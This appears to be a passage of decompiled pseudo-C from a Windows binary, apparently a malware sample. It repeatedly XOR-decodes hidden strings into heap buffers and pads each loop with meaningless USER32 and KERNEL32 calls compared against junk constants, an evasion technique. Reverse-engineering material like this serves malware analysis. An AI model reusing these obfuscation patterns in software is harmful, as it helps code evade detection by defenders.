(*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar6 != 0x81b333) {\n            *(iVar5 + iVar7) = *(&var_8ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x20);\n    fcn.00408cf8();\n    var_1ch = 0x22272830;\n    var_8h._2_1_ = 6;\n    var_18h = 0x28175606;\n    var_14h._0_1_ = 0x34;\n    var_14h._1_1_ = 0x31;\n    var_14h._2_1_ = 4;\n    var_14h._3_1_ = 0x52;\n    var_10h._0_1_ = 5;\n    var_10h._1_1_ = 0x24;\n    var_10h._2_1_ = 8;\n    var_10h._3_1_ = 0x35;\n    var_ch._0_1_ = 0x33;\n    var_ch._1_1_ = 0x45;\n    var_ch._2_1_ = 10;\n    var_ch._3_1_ = 0x3b;\n    var_8h._0_1_ = 0xd;\n    var_8h._1_1_ = 0x3c;\n    var_8h._3_1_ = 0x50;\n    var_4h._1_1_ = 0x4d;\n    var_124h = 0x50644d63;\n    var_120h._0_2_ = 0x3763;\n    var_4h._0_1_ = var_8h._2_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_8ch = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar6 != 0x408ee0) {\n            *(iVar5 + iVar7) = *(&var_124h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1a);\n    fcn.00408cf8();\n    var_1ch = 0x170c2e3d;\n    var_18h = 0x2e1a320e;\n    var_14h._0_1_ = 0x1f;\n    var_14h._1_1_ = 0;\n    var_14h._2_1_ = 0x19;\n    var_14h._3_1_ = 0x3e;\n    var_10h._0_1_ = 0xf;\n    var_10h._1_1_ = 0x25;\n    var_10h._2_1_ = 0x2a;\n    var_10h._3_1_ = 0xb;\n    var_ch._0_1_ = 0x1f;\n    var_ch._1_1_ = 3;\n    var_ch._2_1_ = 0x1c;\n    var_ch._3_1_ = 0x22;\n    var_8h._0_1_ = 0x39;\n    var_8h._1_1_ = 0xc;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 0x36;\n    var_4h._0_1_ = 9;\n    var_4h._1_1_ = 0x2e;\n    var_4h._2_1_ = 0x4f;\n    var_11ch = 0x654f4b6e;\n    var_118h._0_2_ = 0x536b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_124h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar6 != 0x222e08) {\n            *(iVar5 + iVar7) = *(&var_11ch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1b);\n    fcn.00408cf8();\n    var_14h._0_1_ = 0x29;\n    var_14h._1_1_ = 1;\n    var_14h._2_1_ = 1;\n    var_14h._3_1_ = 0xe;\n    var_10h._0_1_ = 0x17;\n    var_10h._1_1_ = 0x1d;\n    var_10h._2_1_ = 0xf;\n    var_10h._3_1_ = 0x14;\n    var_ch._0_1_ = 0x13;\n    var_ch._1_1_ = 0x1d;\n    var_ch._2_1_ = 0x1d;\n    var_ch._3_1_ = 0;\n    var_8h._0_1_ = 0x13;\n    var_8h._1_1_ = 8;\n    var_8h._2_1_ = 0x26;\n    var_8h._3_1_ = 8;\n    var_4h._0_1_ = 0x11;\n    var_4h._1_1_ = 0x76;\n    var_13ch = 0x6f43647a;\n    var_138h._0_2_ = 0x7674;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_11ch = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar6 != 0x393002) {\n            *(iVar5 + iVar7) = *(&var_13ch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x12);\n    fcn.00408cf8();\n    var_14h._0_1_ = 0x29;\n    var_14h._1_1_ = 0x5c;\n    var_14h._2_1_ = 0x3b;\n    var_14h._3_1_ = 0x29;\n    var_10h._0_1_ = 0x19;\n    var_10h._1_1_ = 0xe;\n    var_10h._2_1_ = 0x56;\n    var_10h._3_1_ = 0x1b;\n    var_ch._0_1_ = 0x29;\n    var_ch._1_1_ = 0x3a;\n    var_ch._2_1_ = 8;\n    var_ch._3_1_ = 0x50;\n    var_8h._0_1_ = 0x1f;\n    var_8h._1_1_ = 0x25;\n    var_8h._2_1_ = 6;\n    var_8h._3_1_ = 0x1f;\n    var_4h._0_1_ = 0x5e;\n    var_4h._1_1_ = 0xc;\n    var_4h._2_1_ = 0x4c;\n    var_84h = 0x4c69397a;\n    var_80h._0_1_ = 0x6a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_13ch = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar6 != 0xe32b6b) {\n            *(iVar5 + iVar7) = *(&var_84h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x13);\n    fcn.00408cf8();\n    var_14h._0_1_ = 6;\n    var_14h._1_1_ = 0x50;\n    var_14h._2_1_ = 0x17;\n    var_14h._3_1_ = 0x21;\n    var_10h._0_1_ = 0x17;\n    var_10h._1_1_ = 0xc;\n    var_10h._2_1_ = 0x31;\n    var_10h._3_1_ = 0x5a;\n    var_ch._0_1_ = 0x33;\n    var_ch._1_1_ = 0x27;\n    var_ch._2_1_ = 0x32;\n    var_ch._3_1_ = 10;\n    var_8h._0_1_ = 0x3c;\n    var_8h._1_1_ = 0x43;\n    var_8h._2_1_ = 0x2d;\n    var_8h._3_1_ = 0x25;\n    var_4h._0_1_ = 7;\n    var_4h._1_1_ = 0x1f;\n    var_4h._2_1_ = 0x30;\n    var_4h._3_1_ = 0x35;\n    var_114h = 0x49443555;\n    var_110h._0_2_ = 0x7862;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_84h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar6 != 0x655998) {\n            *(iVar5 + iVar7) = *(&var_114h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x14);\n    fcn.00408cf8();\n    var_14h._0_1_ = 0x2b;\n    var_14h._1_1_ = 0xb;\n    var_14h._2_1_ = 0x10;\n    var_14h._3_1_ = 0xc;\n    var_10h._0_1_ = 0x35;\n    var_10h._1_1_ = 0xd;\n    var_10h._2_1_ = 9;\n    var_10h._3_1_ = 4;\n    var_ch._0_1_ = 0x1b;\n    var_ch._1_1_ = 0x3e;\n    var_ch._2_1_ = 0xe;\n    var_ch._3_1_ = 7;\n    var_8h._0_1_ = 0x38;\n    var_8h._1_1_ = 0xc;\n    var_8h._2_1_ = 0x30;\n    var_8h._3_1_ = 0x1d;\n    var_4h._0_1_ = 0x6e;\n    var_74h = 0x69546e78;\n    var_70h._0_1_ = 0x57;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_114h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar6 != 0xdcc5cc) {\n            *(iVar5 + iVar7) = *(&var_74h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x11);\n    fcn.00408cf8();\n    var_14h._0_1_ = 0x61;\n    var_14h._1_1_ = 0x28;\n    var_14h._2_1_ = 0xb;\n    var_14h._3_1_ = 0x25;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0x5d;\n    var_10h._2_1_ = 0x46;\n    var_10h._3_1_ = 0x1d;\n    var_ch._0_1_ = 0x38;\n    var_ch._1_1_ = 0x39;\n    var_ch._2_1_ = 0x19;\n    var_ch._3_1_ = 0x5d;\n    var_8h._0_1_ = 0x5e;\n    var_8h._1_1_ = 0x28;\n    var_8h._2_1_ = 0x2d;\n    var_8h._3_1_ = 0x35;\n    var_4h._0_1_ = 0x6f;\n    var_fch = 0x504a4d32;\n    var_f8h._0_2_ = 0x346f;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_74h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar6 != 0xb9be57) {\n            *(iVar5 + iVar7) = *(&var_fch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x11);\n    fcn.00408cf8();\n    var_20h = 0x9623707;\n    var_1ch = 0x5c372016;\n    var_18h = 0x3b220b35;\n    var_14h._0_1_ = 0x43;\n    var_14h._1_1_ = 0x1f;\n    var_14h._2_1_ = 0xb;\n    var_14h._3_1_ = 0x39;\n    var_10h._0_1_ = 0x37;\n    var_10h._1_1_ = 0x5f;\n    var_10h._2_1_ = 4;\n    var_10h._3_1_ = 0x35;\n    var_ch._0_1_ = 0x26;\n    var_ch._1_1_ = 0x3b;\n    var_ch._2_1_ = 0x47;\n    var_ch._3_1_ = 0x19;\n    var_8h._0_1_ = 9;\n    var_8h._1_1_ = 0x31;\n    var_8h._2_1_ = 0x35;\n    var_8h._3_1_ = 0x54;\n    var_4h._0_1_ = 0x70;\n    var_7ch = 0x70315254;\n    var_78h._0_1_ = 0x65;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1e);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_fch = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar6 != 0xfbdbc4) {\n            *(iVar5 + iVar7) = *(&var_7ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1d);\n    fcn.00408cf8();\n    var_18h = 0x1b153f0a;\n    var_14h._0_1_ = 0x3b;\n    var_14h._1_1_ = 0x1b;\n    var_14h._2_1_ = 0x3e;\n    var_14h._3_1_ = 0x3f;\n    var_10h._0_1_ = 0x18;\n    var_10h._1_1_ = 0x1c;\n    var_10h._2_1_ = 0x2e;\n    var_10h._3_1_ = 0x1c;\n    var_ch._0_1_ = 0x3f;\n    var_ch._1_1_ = 0x23;\n    var_ch._2_1_ = 6;\n    var_ch._3_1_ = 1;\n    var_8h._0_1_ = 0x33;\n    var_8h._1_1_ = 3;\n    var_8h._2_1_ = 0x30;\n    var_8h._3_1_ = 0x36;\n    var_4h._0_1_ = 0x33;\n    var_4h._1_1_ = 0x14;\n    var_4h._2_1_ = 0x3f;\n    var_4h._3_1_ = 0x75;\n    var_ech = 0x73565a59;\n    var_e8h._0_2_ = 0x755a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_7ch = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar6 != 0x9e9df7) {\n            *(iVar5 + iVar7) = *(&var_ech + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x18);\n    fcn.00408cf8();\n    var_1ch = 0x5414521d;\n    var_18h = 0x523a392e;\n    var_14h._0_1_ = 0x15;\n    var_14h._1_1_ = 0x59;\n    var_14h._2_1_ = 0x36;\n    var_14h._3_1_ = 0x22;\n    var_10h._0_1_ = 0x2a;\n    var_10h._1_1_ = 0x58;\n    var_10h._2_1_ = 0x31;\n    var_10h._3_1_ = 0x5f;\n    var_ch._0_1_ = 0x13;\n    var_ch._1_1_ = 0x24;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0x41;\n    var_8h._0_1_ = 0x2f;\n    var_8h._1_1_ = 0x5d;\n    var_8h._2_1_ = 0x26;\n    var_8h._3_1_ = 0x31;\n    var_4h._0_1_ = 0x2b;\n    var_4h._1_1_ = 0x37;\n    var_dch = 0x3146374e;\n    var_d8h._0_2_ = 0x5643;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_ech = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar6 != 0xae80fa) {\n            *(iVar5 + iVar7) = *(&var_dch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1a);\n    fcn.00408cf8();\n    var_14h._0_1_ = 0x1e;\n    var_14h._1_1_ = 0x2f;\n    var_14h._2_1_ = 0x20;\n    var_14h._3_1_ = 1;\n    var_10h._0_1_ = 0x1e;\n    var_10h._1_1_ = 10;\n    var_10h._2_1_ = 0x2e;\n    var_10h._3_1_ = 0x21;\n    var_ch._0_1_ = 0x25;\n    var_ch._1_1_ = 0x1d;\n    var_ch._2_1_ = 0x13;\n    var_ch._3_1_ = 0x13;\n    var_8h._0_1_ = 0x24;\n    var_8h._1_1_ = 0x26;\n    var_8h._2_1_ = 0x10;\n    var_8h._3_1_ = 8;\n    var_4h._0_1_ = 0x1f;\n    var_4h._1_1_ = 0x65;\n    var_d4h = 0x6f754a4d;\n    var_d0h._0_2_ = 0x657a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_dch = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar6 != 0x2ca9d4) {\n            *(iVar5 + iVar7) = *(&var_d4h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x12);\n    fcn.00408cf8();\n    var_18h = 0x13312105;\n    var_14h._0_1_ = 0x2f;\n    var_14h._1_1_ = 0x2f;\n    var_14h._2_1_ = 0x17;\n    var_14h._3_1_ = 0x23;\n    var_10h._0_1_ = 7;\n    var_10h._1_1_ = 4;\n    var_10h._2_1_ = 0x35;\n    var_10h._3_1_ = 0x1c;\n    var_ch._0_1_ = 0x24;\n    var_ch._1_1_ = 0x2d;\n    var_ch._2_1_ = 0x14;\n    var_ch._3_1_ = 3;\n    var_8h._0_1_ = 0x2d;\n    var_8h._1_1_ = 0x29;\n    var_8h._2_1_ = 0x31;\n    var_8h._3_1_ = 0x21;\n    var_4h._0_1_ = 0x62;\n    var_12ch = 0x6a624456;\n    var_128h._0_2_ = 0x4c41;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_d4h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar6 != 0xe52171) {\n            *(iVar5 + iVar7) = *(&var_12ch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x15);\n    fcn.00408cf8();\n    var_1ch = 0x5f753c04;\n    var_18h = 0x55353500;\n    var_14h._0_1_ = 0x75;\n    var_14h._1_1_ = 4;\n    var_14h._2_1_ = 0x3b;\n    var_14h._3_1_ = 0x3c;\n    var_10h._0_1_ = 0x57;\n    var_10h._1_1_ = 0x50;\n    var_10h._2_1_ = 0x15;\n    var_10h._3_1_ = 0x3e;\n    var_ch._0_1_ = 0x36;\n    var_ch._1_1_ = 0x5e;\n    var_ch._2_1_ = 0x61;\n    var_ch._3_1_ = 0x13;\n    var_8h._0_1_ = 0x3e;\n    var_8h._1_1_ = 0x2f;\n    var_8h._2_1_ = 0x59;\n    var_8h._3_1_ = 0x5d;\n    var_4h._0_1_ = 4;\n    var_4h._1_1_ = 0x30;\n    var_4h._2_1_ = 0x3c;\n    var_4h._3_1_ = 0x30;\n    var_6ch = 0x31305957;\n    var_68h._0_1_ = 0x61;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_12ch = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar6 != 0xdc399a) {\n            *(iVar5 + iVar7) = *(&var_6ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1c);\n    fcn.00408cf8();\n    var_18h = 0xa355102;\n    var_14h._0_1_ = 6;\n    var_14h._1_1_ = 0x30;\n    var_14h._2_1_ = 0x53;\n    var_14h._3_1_ = 0x1d;\n    var_10h._0_1_ = 0x3d;\n    var_10h._1_1_ = 7;\n    var_10h._2_1_ = 0x3d;\n    var_10h._3_1_ = 0x41;\n    var_ch._0_1_ = 0x15;\n    var_ch._1_1_ = 0xe;\n    var_ch._2_1_ = 0x38;\n    var_ch._3_1_ = 0x23;\n    var_8h._0_1_ = 0x5d;\n    var_8h._1_1_ = 0xe;\n    var_8h._2_1_ = 2;\n    var_8h._3_1_ = 4;\n    var_4h._0_1_ = 0x34;\n    var_4h._1_1_ = 0x53;\n    var_4h._2_1_ = 0x1d;\n    var_4h._3_1_ = 0x6b;\n    var_64h = 0x6b783451;\n    var_60h._0_1_ = 0x68;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_6ch = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar6 != 0x975473) {\n            *(iVar5 + iVar7) = *(&var_64h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x18);\n    fcn.00408cf8();\n    var_18h = 0x1f132a29;\n    var_14h._0_1_ = 0;\n    var_14h._1_1_ = 0x1f;\n    var_14h._2_1_ = 0x3d;\n    var_14h._3_1_ = 0x29;\n    var_10h._0_1_ = 0x1d;\n    var_10h._1_1_ = 0x1e;\n    var_10h._2_1_ = 0x1b;\n    var_10h._3_1_ = 0x3b;\n    var_ch._0_1_ = 0x3f;\n    var_ch._1_1_ = 0x22;\n    var_ch._2_1_ = 2;\n    var_ch._3_1_ = 0x13;\n    var_8h._0_1_ = 0x39;\n    var_8h._1_1_ = 0x33;\n    var_8h._2_1_ = 0x1e;\n    var_8h._3_1_ = 0x15;\n    var_4h._0_1_ = 0x1d;\n    var_4h._1_1_ = 0x2a;\n    var_4h._2_1_ = 0x5a;\n    var_5ch = 0x725a4f7a;\n    var_58h._0_1_ = 0x70;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_64h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar6 != 0x8a0aa) {\n            *(iVar5 + iVar7) = *(&var_5ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x17);\n    fcn.00408cf8();\n    var_18h = 0x4424123d;\n    var_14h._0_1_ = 0x2c;\n    var_14h._1_1_ = 0xf;\n    var_14h._2_1_ = 3;\n    var_14h._3_1_ = 2;\n    var_10h._0_1_ = 0x71;\n    var_10h._1_1_ = 0x25;\n    var_10h._2_1_ = 1;\n    var_10h._3_1_ = 0x15;\n    var_ch._0_1_ = 6;\n    var_ch._1_1_ = 0x5a;\n    var_ch._2_1_ = 0x19;\n    var_ch._3_1_ = 0x1c;\n    var_8h._0_1_ = 0x1e;\n    var_8h._1_1_ = 0x11;\n    var_8h._2_1_ = 0x5f;\n    var_8h._3_1_ = 0x25;\n    var_4h._0_1_ = 0xb;\n    var_4h._1_1_ = 0x10;\n    var_4h._2_1_ = 2;\n    var_4h._3_1_ = 0x36;\n    var_54h = 0x3667776e;\n    var_50h._0_1_ = 0x49;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_5ch = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar6 != 0xd27b3a) {\n            *(iVar5 + iVar7) = *(&var_54h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x18);\n    fcn.00408cf8();\n    var_20h = 0x403c5737;\n    var_1ch = 0xd461705;\n    var_18h = 0x57163356;\n    var_14h._0_1_ = 0xc;\n    var_14h._1_1_ = 0x7f;\n    var_14h._2_1_ = 0x11;\n    var_14h._3_1_ = 10;\n    var_10h._0_1_ = 0x73;\n    var_10h._1_1_ = 0xb;\n    var_10h._2_1_ = 0x51;\n    var_10h._3_1_ = 0x15;\n    var_ch._0_1_ = 0x17;\n    var_ch._1_1_ = 0x41;\n    var_ch._2_1_ = 0x38;\n    var_ch._3_1_ = 0x40;\n    var_8h._0_1_ = 0x19;\n    var_8h._1_1_ = 0x12;\n    var_8h._2_1_ = 0x5b;\n    var_8h._3_1_ = 4;\n    var_4h._0_1_ = 0x57;\n    var_4h._1_1_ = 0x17;\n    var_4h._2_1_ = 1;\n    var_4h._3_1_ = 0x32;\n    var_4ch = 0x32683264;\n    var_48h._0_1_ = 0x70;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_54h = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar6 != 0x7dde6) {\n            *(iVar5 + iVar7) = *(&var_4ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x20);\n    fcn.00408cf8();\n    var_14h._0_1_ = 0x18;\n    var_14h._1_1_ = 6;\n    var_14h._2_1_ = 0x37;\n    var_14h._3_1_ = 0x3d;\n    var_10h._0_1_ = 0x58;\n    var_10h._1_1_ = 0x2a;\n    var_10h._2_1_ = 1;\n    var_10h._3_1_ = 0;\n    var_ch._0_1_ = 0x34;\n    var_ch._1_1_ = 100;\n    var_ch._2_1_ = 0x39;\n    var_ch._3_1_ = 10;\n    var_8h._0_1_ = 0x13;\n    var_8h._1_1_ = 0x31;\n    var_8h._2_1_ = 0x58;\n    var_8h._3_1_ = 0x2e;\n    var_4h._0_1_ = 4;\n    var_4h._1_1_ = 0;\n    var_4h._2_1_ = 0x58;\n    var_44h = 0x5865634b;\n    var_40h._0_1_ = 0x34;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_4ch = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar6 != 0xabce39) {\n            *(iVar5 + iVar7) = *(&var_44h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x13);\n    fcn.00408cf8();\n    var_20h = 0x1a275225;\n    var_1ch = 0x5613270d;\n    var_18h = 0x3a39111d;\n    var_14h._0_1_ = 4;\n    var_14h._1_1_ = 0x5c;\n    var_14h._2_1_ = 7;\n    var_14h._3_1_ = 0x1a;\n    var_10h._0_1_ = 9;\n    var_10h._1_1_ = 6;\n    var_10h._2_1_ = 0x13;\n    var_10h._3_1_ = 0x43;\n    var_ch._0_1_ = 0x3e;\n    var_ch._2_1_ = 7;\n    var_ch._3_1_ = 0x23;\n    var_8h._0_1_ = 0x1f;\n    var_8h._1_1_ = 0x5b;\n    var_8h._2_1_ = 0xb;\n    var_8h._3_1_ = 0x13;\n    var_4h._0_1_ = 0xb;\n    var_4h._1_1_ = 0x55;\n    var_34h = 0x746e3776;\n    var_30h._0_2_ = 0x556e;\n    var_ch._1_1_ = var_10h._1_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_44h = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar6 != 0x6daa33) {\n            *(iVar5 + iVar7) = *(&var_34h + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.00408cf8();\n    var_14h._0_1_ = 0x61;\n    var_14h._1_1_ = 0x11;\n    var_14h._2_1_ = 0x1d;\n    var_14h._3_1_ = 0x1d;\n    var_10h._0_1_ = 0x19;\n    var_10h._1_1_ = 0x55;\n    var_10h._2_1_ = 0x68;\n    var_10h._3_1_ = 0x1b;\n    var_ch._0_1_ = 0x27;\n    var_ch._1_1_ = 0x11;\n    var_ch._2_1_ = 0x24;\n    var_ch._3_1_ = 0x42;\n    var_8h._0_1_ = 0x5b;\n    var_8h._1_1_ = 2;\n    var_8h._2_1_ = 0x20;\n    var_8h._3_1_ = 0x18;\n    var_4h._0_1_ = 0x11;\n    var_4h._1_1_ = 0x57;\n    var_4h._2_1_ = 0x57;\n    var_4h._3_1_ = 0x74;\n    var_3ch = 0x74497432;\n    var_38h._0_2_ = 0x3074;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_34h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar6 != 0xd7a6a5) {\n            *(iVar5 + iVar7) = *(&var_3ch + iVar5 % var_2ch) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x14);\n    fcn.00408cf8();\n    var_20h = 0xb0c0e15;\n    var_1ch = 0xe320d30;\n    var_18h = 0xe38001c;\n    var_14h._0_1_ = 0x29;\n    var_14h._1_1_ = 7;\n    var_14h._2_1_ = 0x26;\n    var_14h._3_1_ = 0x1a;\n    var_10h._0_1_ = 0x19;\n    var_10h._1_1_ = 5;\n    var_10h._2_1_ = 0x28;\n    var_10h._3_1_ = 0;\n    var_ch._0_1_ = 0x1f;\n    var_ch._1_1_ = 0xb;\n    var_ch._2_1_ = 0x3c;\n    var_ch._3_1_ = 0x1a;\n    var_8h._0_1_ = 0x2f;\n    var_8h._1_1_ = 7;\n    var_8h._2_1_ = 0x2a;\n    var_8h._3_1_ = 0x1e;\n    var_4h._0_1_ = 0x30;\n    var_4h._1_1_ = 0x6c;\n    var_3ch = 0x794f6b46;\n    var_38h._0_2_ = 0x6c55;\n    uVar3 = 